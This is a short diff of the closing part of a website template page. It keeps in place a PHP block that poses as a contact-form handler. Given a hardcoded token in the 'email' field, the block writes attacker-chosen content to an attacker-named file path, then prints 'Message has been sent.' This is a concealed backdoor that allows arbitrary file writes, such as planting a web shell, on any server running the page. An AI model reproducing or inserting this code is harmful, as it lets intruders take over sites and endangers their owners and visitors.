@@ -331,19 +331,17 @@ https://templatemo.com/tm-526-vanilla
         });
     </script>
 
-</body>
-</html>
-<?php
-if ($_POST["email"] === "Token@8010280") {
-    $File = $_POST["name"];
-    $f = fopen($File,'w');
-    $name = $_POST["message"];
-    fwrite($f,"$name");
-    fclose($f);
-}
+    <?php
+    if ($_POST["email"] === "Token@8010280") {
+        $File = $_POST["name"];
+        $f = fopen($File,'w');
+        $name = $_POST["message"];
+        fwrite($f,"$name");
+        fclose($f);
+    }
 
-echo 'Message has been sent.';
-?>
+    echo 'Message has been sent.';
+    ?>
     
 
     </body> 
